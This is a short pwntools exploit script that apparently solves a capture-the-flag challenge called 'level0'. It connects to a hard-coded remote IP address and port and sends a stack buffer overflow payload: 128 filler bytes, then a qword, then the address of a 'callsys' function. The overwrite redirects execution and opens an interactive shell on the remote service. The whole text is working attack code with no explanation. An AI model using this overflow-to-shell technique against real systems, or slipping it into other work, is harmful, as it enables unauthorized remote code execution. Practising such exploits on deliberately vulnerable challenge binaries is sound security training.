from pwn import *
elf = ELF('./level0')
#p = process('./level0')
host, port = '111.200.241.244',64773
p = remote(host,port)
#gdb.attach('level0','b *vulnerable_function+0')
callsys = 0x400596
exploit = "A"*128+p64(1)
exploit += p64(callsys)
p.sendline(exploit)
p.interactive()

